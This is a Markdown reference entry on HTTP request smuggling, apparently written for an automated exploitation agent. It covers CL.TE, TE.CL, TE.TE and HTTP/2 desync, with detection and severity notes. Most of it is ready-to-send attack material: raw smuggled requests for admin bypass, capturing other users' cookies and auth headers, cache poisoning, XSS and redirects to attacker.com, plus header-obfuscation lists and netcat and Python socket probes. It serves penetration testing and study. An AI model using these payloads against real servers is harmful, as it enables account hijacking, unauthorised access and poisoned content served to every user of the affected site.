---
vuln_type: http_request_smuggling
severity: critical
cwe: [CWE-444]
owasp: A05:2021-Security-Misconfiguration
related_tools: [curl, interactsh]
exploit_agent: exploit_agent
tags: [http-smuggling, request-smuggling, cl-te, te-cl, te-te, desync, cache-poisoning, header-injection]
---

# HTTP Request Smuggling

## Overview
Exploits discrepancies in how front-end (reverse proxy, CDN, load balancer) and back-end servers parse HTTP request boundaries. By crafting ambiguous requests, an attacker can "smuggle" a hidden request inside a legitimate one, leading to access control bypass, cache poisoning, credential hijacking, and request hijacking.

---

## How It Works

HTTP uses two headers to determine request body length:
- `Content-Length` (CL): byte count of the body
- `Transfer-Encoding: chunked` (TE): body sent in chunks, terminated by `0\r\n\r\n`

**Vulnerability arises when front-end and back-end disagree on which header to use.**

---

## Smuggling Types

### CL.TE — Front-end uses Content-Length, Back-end uses Transfer-Encoding

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Front-end sees CL=13, forwards 13 bytes (`0\r\n\r\nSMUGGLED`).
Back-end sees chunked, reads `0\r\n\r\n` (end of chunks), treats `SMUGGLED` as the start of the next request.

### TE.CL — Front-end uses Transfer-Encoding, Back-end uses Content-Length

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

Front-end sees chunked, reads chunk `8\r\nSMUGGLED\r\n0\r\n\r\n`.
Back-end sees CL=3, reads `8\r\n` (3 bytes), treats `SMUGGLED\r\n0\r\n\r\n` as the next request.

### TE.TE — Both support chunked, but one can be confused

Obfuscate `Transfer-Encoding` so one server ignores it:

```http
Transfer-Encoding: chunked
Transfer-Encoding: cow

Transfer-Encoding: chunked
Transfer-encoding: x

Transfer-Encoding:[tab]chunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
 : chunked
```

---

## Detection Techniques

### Timing-Based Detection

**CL.TE detection:**
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
If CL.TE: Back-end reads chunked, waits for chunk terminator → **timeout/delay**.
If TE.CL: Normal response (CL=4 covers the body).

**TE.CL detection:**
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
If TE.CL: Back-end reads CL=6, waits for more data → **timeout/delay**.
If CL.TE: Normal response (chunked ends at `0`).

### Differential Response Detection
Send a smuggled request that changes the next response:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 49
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

```
If the next legitimate request gets the `/admin` response → smuggling confirmed.

---

## Exploitation Scenarios

### 1. Bypass Access Controls

Smuggle a request to a restricted endpoint:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Front-end only sees the outer request (to `/`), which is allowed.
Back-end processes the smuggled request to `/admin`.

### 2. Steal Other Users' Requests (Credential Hijacking)

Smuggle a request that causes the next user's request to be appended to an attacker-controlled parameter:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

data=
```
The next user's request (with cookies, auth headers) gets appended to `data=` and sent to `/log` which the attacker can read.

### 3. Cache Poisoning via Smuggling

Smuggle a request that changes the cached response for a URL:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: target.com
Content-Length: 50

GET /poisoned-response HTTP/1.1
Foo: bar
```
If the cache associates the smuggled response with `/static/main.js`, all users get the poisoned version.

### 4. Reflect XSS via Smuggling

Smuggle a request that triggers XSS in a way the front-end wouldn't allow:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: target.com
Content-Length: 10

x=1
```

### 5. Open Redirect via Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 120
Transfer-Encoding: chunked

0

GET /login HTTP/1.1
Host: attacker.com

```
If the app generates redirects based on the Host header, the next user gets redirected to `attacker.com`.

---

## HTTP/2 Request Smuggling

### H2.CL (HTTP/2 front-end, HTTP/1.1 back-end)
HTTP/2 uses frame length for body boundaries. If the back-end downgrades to HTTP/1.1:

```
:method: POST
:path: /
:authority: target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com

```
HTTP/2 front-end: body length from frame = entire body.
HTTP/1.1 back-end: CL=0, treats the rest as a new request.

### H2.TE
```
:method: POST
:path: /
:authority: target.com
transfer-encoding: chunked

0

SMUGGLED REQUEST
```

### HTTP/2-Only Smuggling (CRLF injection in headers)
```
:method: POST
:path: /
:authority: target.com
header: value\r\nTransfer-Encoding: chunked
```
HTTP/2 allows headers that HTTP/1.1 would reject — injecting CRLF can create smuggled headers.

---

## Bypass Techniques

### Transfer-Encoding Obfuscation
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
GET / HTTP/1.1
 Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
```

### Content-Length Tricks
```
Content-Length: 6
Content-Length: 0      (duplicate CL — which one wins?)
```

---

## Testing with curl

```bash
# Basic CL.TE probe
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80

# Note: curl doesn't easily send malformed HTTP
# Preferred tools: netcat, custom Python scripts, Burp Suite Turbo Intruder

# Python detection script
python3 -c "
import socket
s = socket.socket()
s.connect(('target.com', 80))
s.send(b'POST / HTTP/1.1\r\n'
       b'Host: target.com\r\n'
       b'Content-Length: 4\r\n'
       b'Transfer-Encoding: chunked\r\n'
       b'\r\n'
       b'1\r\nA\r\nX')
import time
time.sleep(5)
print(s.recv(4096).decode())
s.close()
"
```

### Nuclei Templates
```bash
nuclei -u https://target.com -t http/request-smuggling/
```

---

## Important Notes

- **Request smuggling requires HTTP/1.1 connection reuse** — it doesn't work if each request gets a new connection
- **HTTPS doesn't prevent it** — smuggling operates at the HTTP layer, not TLS
- **HTTP/2 end-to-end prevents CL.TE/TE.CL** but introduces new H2-specific variants
- **Testing can affect other users** — smuggled requests poison the connection pool. Test carefully in production.
- **Detection before exploitation** — always use timing/differential techniques before attempting to exploit

---

## Output Interpretation

### Confirmed smuggling indicators
- Timing delay on one probe type but not the other (CL.TE vs TE.CL)
- Response from smuggled path (e.g., `/admin` response on a `/` request)
- Next request gets unexpected response (desync)
- Different `Content-Length` and `Transfer-Encoding` handling confirmed
- Cache returns poisoned response after smuggling attack

### Not smuggling (false positives)
- Both servers handle CL/TE consistently → no desync
- Timing delay caused by network latency, not parsing difference
- Front-end strips/normalizes Transfer-Encoding before forwarding
- Single-server architecture (no front-end/back-end split)

### Severity assessment
- **Critical**: Credential/session hijacking (stealing other users' requests)
- **Critical**: Access control bypass to admin/internal endpoints
- **Critical**: Cache poisoning affecting all users
- **High**: XSS via smuggled request
- **High**: Request routing manipulation
- **Medium**: Confirmed desync but limited exploitation path
